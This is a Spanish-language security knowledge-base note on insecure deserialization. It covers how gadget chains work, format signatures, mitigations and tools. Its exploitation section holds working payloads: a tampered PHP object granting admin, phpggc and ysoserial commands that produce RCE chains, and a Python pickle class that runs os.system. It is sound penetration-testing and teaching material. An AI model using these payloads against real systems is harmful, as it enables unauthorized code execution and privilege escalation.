---
tags:
  - seguridad-web
  - owasp
  - deserializacion
aliases:
  - Deserialización insegura
  - Insecure Deserialization
  - Object Injection
---

# Deserialización insegura

**La deserialización insegura ocurre cuando una aplicación reconstruye objetos a partir de datos serializados controlables por el usuario.** Manipular esos datos puede alterar la lógica, inyectar objetos y, encadenando *gadgets*, lograr ejecución remota de código.

> [!warning] Uso autorizado
> Técnicas para pruebas en sistemas propios o con autorización explícita. Ver [[📜 Fuentes y Licencias]].

## ¿Cómo funciona?
Serializar convierte un objeto en un formato transmisible/almacenable; deserializar lo reconstruye. Si la entrada deserializada no es de confianza, el atacante modifica los datos serializados (en cookies, parámetros ocultos, tokens) para cambiar atributos o, mejor aún, encadenar **POP gadgets**: fragmentos de código de clases ya presentes que se invocan durante la deserialización (métodos mágicos como `__wakeup`, `readObject`, `__reduce__`) hasta alcanzar una primitiva peligrosa (ejecución de comandos, escritura de archivos).

## Detección y pruebas
Busca blobs serializados en cookies, campos ocultos, cabeceras y APIs. Identifica el formato por su cabecera:

| Tipo | Hex | Base64 | Indicadores |
|---|---|---|---|
| Java | `AC ED` | `rO` | decodifica y revisa primeros bytes |
| PHP | `4F 3A` | `Tz` | prefijos `O:`, `a:`, `s:`, `i:`, `b:` |
| Python pickle | `80 04 95` | `gASV` | opcodes como `(lp0`, `S'Test'` |
| Ruby Marshal | `04 08` | `BAgK` | `\x04\x08` al inicio |
| .NET ViewState | `FF 01` | `/w` | en inputs ocultos de formularios |
| .NET BinaryFormatter | `0001 0000 00FF FFFF FF01` | `AAEAAAD` | secuencia larga `FF FF FF FF` |

Prueba primero modificando atributos simples del objeto serializado para ver si la app cambia de comportamiento (señal de deserialización sin validar).

## Explotación / payloads
**PHP (object injection):** ajusta manualmente la cadena serializada o genera cadenas de gadgets con **phpggc**:

```bash
# Serialización PHP de un objeto controlado
O:4:"User":1:{s:8:"is_admin";b:1;}

# Gadget chain (ej. Monolog) -> RCE
phpggc Monolog/RCE1 system id
```

**Java:** detección con cabecera `rO0AB...` (Base64) y explotación con **ysoserial** sobre cadenas conocidas (Apache Commons Collections, etc.):

```bash
java -jar ysoserial.jar CommonsCollections5 'id' | base64
```

**Python (pickle):** `pickle.loads` sobre datos del usuario ejecuta `__reduce__` al deserializar:

```python
import pickle, os, base64
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
print(base64.b64encode(pickle.dumps(RCE())))
```

Cuidado equivalente con **PyYAML** (`yaml.load` sin `SafeLoader`), **Ruby Marshal** (gadget RCE universal) y **.NET** (`ysoserial.net`, abuso de ViewState/BinaryFormatter). En PHP, el wrapper `phar://` permite disparar deserialización aunque no haya un `unserialize()` explícito.

## Mitigación
- **No deserializar datos no confiables.** Preferir formatos de datos puros (JSON con parsers simples) en vez de serialización de objetos nativa.
- Firmar/cifrar (HMAC) los blobs serializados para detectar manipulación; verificar integridad antes de procesar.
- Aplicar **listas de permitidos de clases** durante la deserialización (`ObjectInputFilter` en Java, `SafeLoader` en YAML, evitar `pickle` con datos externos).
- Aislar el proceso de deserialización con privilegios mínimos; mantener dependencias actualizadas para evitar gadgets conocidos.

## Herramientas
- **ysoserial** (Java) / **ysoserial.net** (.NET) — generación de cadenas de gadgets.
- **phpggc** — cadenas de gadgets para PHP.
- **GadgetProbe** (Burp) — sondeo de clases en endpoints Java.

---
🔗 Relacionado: [[IDOR]] · [[SSTI (Server-Side Template Injection)]] · [[Laboratorio DVWA (CTF)]]
📚 Fuente: [PayloadsAllTheThings — Insecure Deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization) (MIT, © Swissky)
